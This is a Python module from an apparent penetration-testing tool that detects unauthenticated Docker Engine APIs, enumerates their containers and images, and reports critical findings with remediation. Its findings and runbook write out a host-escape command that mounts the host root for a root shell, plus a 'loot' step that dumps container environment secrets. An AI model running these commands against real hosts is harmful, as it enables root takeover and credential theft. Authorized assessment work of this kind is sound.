"""Deep Docker Engine API enumeration + vulnerability identification (stdlib only).

An exposed, unauthenticated Docker Engine API (TCP 2375 plain, or 2376 without
client-certificate enforcement) is a full host compromise: anyone who can reach it
can create a container that bind-mounts the host root and runs as root, i.e. instant
root-level RCE on the Docker host. recce reads the API unauthenticated - /version,
/info, /containers/json, /images/json - and, if it answers, reports a CONFIRMED
critical finding (the successful unauthenticated read IS the proof). Everything folds
into the main totals and a dedicated Docker tab. Airgapped, stdlib only. Safety
posture: see SECURITY.md.
"""
from __future__ import annotations

import http.client
import json
import ssl

from .models import Host, Port

_PORTS = (2375, 2376)
_TIMEOUT = 6.0


def is_docker(port: Port) -> bool:
    if port.state != "open":
        return False
    if port.portid in _PORTS:
        return True
    return "docker" in f"{port.service} {port.product}".lower()


def _scheme(port: int) -> str:
    return "https" if port == 2376 else "http"


_READ_CAP = 16 * 1024 * 1024   # hard ceiling on a single response body (16 MB)


def _read_capped(resp, cap: int = _READ_CAP) -> bytes:
    """Read an HTTP response to EOF, bounded by `cap` - so a large /containers/json
    or /images/json isn't truncated mid-buffer (which broke json parsing)."""
    chunks, total = [], 0
    while total < cap:
        chunk = resp.read(min(65536, cap - total))
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)
    return b"".join(chunks)


def _get(ip: str, port: int, path: str, timeout: float = _TIMEOUT):
    """GET a Docker API path. Returns (status, parsed_json_or_text) or None."""
    conn = None
    try:
        if _scheme(port) == "https":
            conn = http.client.HTTPSConnection(
                ip, port, timeout=timeout, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=timeout)
        conn.request("GET", path, headers={"Accept": "application/json",
                                           "User-Agent": "recce-docker/1.0"})
        resp = conn.getresponse()
        body = _read_capped(resp).decode("utf-8", "replace")
        try:
            return resp.status, json.loads(body)
        except ValueError:
            return resp.status, body
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict | None:
    """Read the Docker API unauthenticated. Returns a dict with `exposed` True when
    /version or /info answered 200 with JSON, else None."""
    ver = _get(ip, port, "/version", timeout)
    if not ver or ver[0] != 200 or not isinstance(ver[1], dict):
        # /version may 404 on very old daemons; fall back to /info.
        info = _get(ip, port, "/info", timeout)
        if not info or info[0] != 200 or not isinstance(info[1], dict):
            return None
        v = {}
    else:
        v = ver[1]
        info = _get(ip, port, "/info", timeout)
    out = {"ip": ip, "port": port, "exposed": True,
           "version": v.get("Version", ""), "api_version": v.get("ApiVersion", ""),
           "os": v.get("Os", ""), "arch": v.get("Arch", ""),
           "kernel": v.get("KernelVersion", "")}
    if info and info[0] == 200 and isinstance(info[1], dict):
        d = info[1]
        out["name"] = d.get("Name", "")
        out["containers"] = d.get("Containers")
        out["containers_running"] = d.get("ContainersRunning")
        out["images"] = d.get("Images")
        out["server_version"] = d.get("ServerVersion", "")
        out["kernel"] = out["kernel"] or d.get("KernelVersion", "")
    # Running containers + images (best-effort enrichment).
    cj = _get(ip, port, "/containers/json", timeout)
    if cj and cj[0] == 200 and isinstance(cj[1], list):
        out["running"] = [
            {"image": c.get("Image", ""),
             "names": [n.lstrip("/") for n in (c.get("Names") or [])],
             "command": c.get("Command", ""), "state": c.get("State", "")}
            for c in cj[1][:25] if isinstance(c, dict)]
    ij = _get(ip, port, "/images/json", timeout)
    if ij and ij[0] == 200 and isinstance(ij[1], list):
        tags = []
        for im in ij[1]:
            if isinstance(im, dict):
                tags.extend(im.get("RepoTags") or [])
        out["image_tags"] = [t for t in tags if t and t != "<none>:<none>"][:40]
    return out


def docker_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_docker(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives -----------------------------------------------------------------

_NARRATIVE = {
    "docker_api": (
        "An unauthenticated Docker Engine API is the single highest-impact network "
        "exposure short of a shell: the daemon runs as root, and anyone who can reach "
        "the socket can tell it to create a container that bind-mounts the host's root "
        "filesystem (`-v /:/host`) and runs as root - then read or write ANY file on "
        "the host, add a root user, drop an SSH key, or chroot into the host for a full "
        "interactive root shell. It is remote, pre-authentication, root-level code "
        "execution on the Docker host, and it also exposes every other container's "
        "environment, secrets and mounted volumes. recce proves the exposure by "
        "reading /version and /info without any credential; it deliberately does NOT "
        "create a container (that would be an intrusive change) - the successful "
        "unauthenticated read is already proof the escape path is open."),
    "docker_secrets": (
        "The daemon's container/image inventory is readable unauthenticated. Image "
        "names and container commands routinely leak internal registry hosts, app "
        "versions and, via `docker inspect`-style data, environment variables holding "
        "database passwords, API keys and cloud credentials - reconnaissance that "
        "feeds the next hop even before the container-escape is used."),
}


def narrative_for(kind: str) -> str:
    return _NARRATIVE.get(kind, "")


TESTING_NARRATIVE = [
    ("1. Unauthenticated API read (stdlib)",
     "recce issues plain HTTP(S) GETs to the Docker Engine API (/version, /info, "
     "/containers/json, /images/json) with no credential. A 200 with JSON means the "
     "daemon is exposed without authentication."),
    ("2. Impact",
     "An exposed daemon = remote root RCE on the host via a privileged/host-mounted "
     "container. recce reports it CONFIRMED critical from the successful read; it does "
     "NOT create a container (that would be intrusive)."),
    ("3. Enumeration",
     "The running containers and image tags are captured as evidence and for the "
     "secret-leak angle (registry hosts, app versions, env-var secrets via inspect)."),
    ("4. Runbook",
     "The exact escape command (docker -H run a root-mounted container) and the "
     "inspect-for-secrets sweep are staged, to run within ROE."),
]


# --- findings -------------------------------------------------------------------

def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
    return {"category": "docker", "severity": sev, "title": title, "target": target,
            "detail": detail, "tool": tool, "command": cmd, "remediation": rem,
            "cwes": list(cwes), "kind": kind, "narrative": _NARRATIVE.get(kind, "")}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_docker(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not (pr and pr.get("exposed")):
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("server_version") or pr.get("version") or "?"
            cnt = pr.get("containers")
            img = pr.get("images")
            detail = (f"The Docker Engine API answered /version and /info WITHOUT "
                      f"authentication (daemon {ver}"
                      + (f", {cnt} container(s), {img} image(s)" if cnt is not None else "")
                      + f", host '{pr.get('name', '?')}'). The daemon runs as root, so "
                      "this is remote root RCE on the host via a host-mounted container.")
            out.append(_finding(
                "critical", "Docker Engine API exposed without authentication", tgt,
                detail, "docker CLI",
                f"docker -H {_scheme(p.portid)}://<ip>:{p.portid} run --rm -v /:/host "
                "-it alpine chroot /host sh   # root shell on the host (ROE)",
                "Never bind the Docker API to a network socket unauthenticated. Bind to "
                "the local unix socket only, or enforce mutual-TLS (2376 with "
                "--tlsverify and client certs) and firewall the port.",
                ["CWE-306", "CWE-284", "CWE-269"], kind="docker_api"))
            running = pr.get("running") or []
            tags = pr.get("image_tags") or []
            if running or tags:
                bits = []
                if running:
                    bits.append("containers: " + ", ".join(
                        (r["names"][0] if r.get("names") else r.get("image", "?"))
                        for r in running[:12]))
                if tags:
                    bits.append("images: " + ", ".join(tags[:12]))
                out.append(_finding(
                    "high", "Docker container/image inventory readable unauthenticated",
                    tgt, "Unauthenticated API enumeration leaked the workload "
                    "inventory.  " + "  |  ".join(bits),
                    "docker CLI",
                    f"docker -H {_scheme(p.portid)}://<ip>:{p.portid} ps -a ; "
                    f"docker -H ...:{p.portid} inspect <id>   # env vars often hold secrets",
                    "Same as above - lock down the API; treat leaked image/registry "
                    "names and env secrets as compromised.",
                    ["CWE-200"], kind="docker_secrets"))
    return out


# --- runbook --------------------------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    sch = _scheme(port)
    steps = [
        ("enumerate", "docker",
         f"docker -H {sch}://<ip>:{port} version ; docker -H {sch}://<ip>:{port} info",
         "Confirm the unauthenticated daemon and its version."),
        ("enumerate", "docker",
         f"docker -H {sch}://<ip>:{port} ps -a ; docker -H {sch}://<ip>:{port} images",
         "List containers and images."),
        ("loot", "docker inspect",
         f"docker -H {sch}://<ip>:{port} inspect $(docker -H {sch}://<ip>:{port} ps -q)",
         "Pull env vars / mounts from every container - secrets live here."),
        ("escalate", "container escape",
         f"docker -H {sch}://<ip>:{port} run --rm -v /:/host -it alpine "
         "chroot /host sh   # root shell on the host (ROE)",
         "Mount the host root into a container -> root on the host."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w} for ph, t, c, w in steps]


# --- proof screenshot -----------------------------------------------------------

def proof_html(command, output, banner: str = "") -> str:
    from . import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


# --- top-level analyze ----------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """Docker findings -> {ip: [Vuln]} (source='docker')."""
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "docker", 2375)


def analyze(hosts: list[Host], active: bool = True) -> dict:
    """Full Docker analysis. Returns {targets, findings, runbooks, stats}."""
    targets = docker_targets(hosts)
    probes: dict = {}
    if active:
        for t in targets:
            t["probed"] = True
            pr = probe(t["ip"], t["port"])
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["exposed"] = pr.get("exposed", False)
                t["version"] = pr.get("server_version") or pr.get("version") or ""
                t["containers"] = pr.get("containers")
                t["images"] = pr.get("images")
                t["name"] = pr.get("name", "")
            else:
                # The port answered TCP (it's a target) but the API read failed -
                # mutual-TLS-locked or authenticated, not unauth-exposed.
                t["exposed"] = False
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs)}}
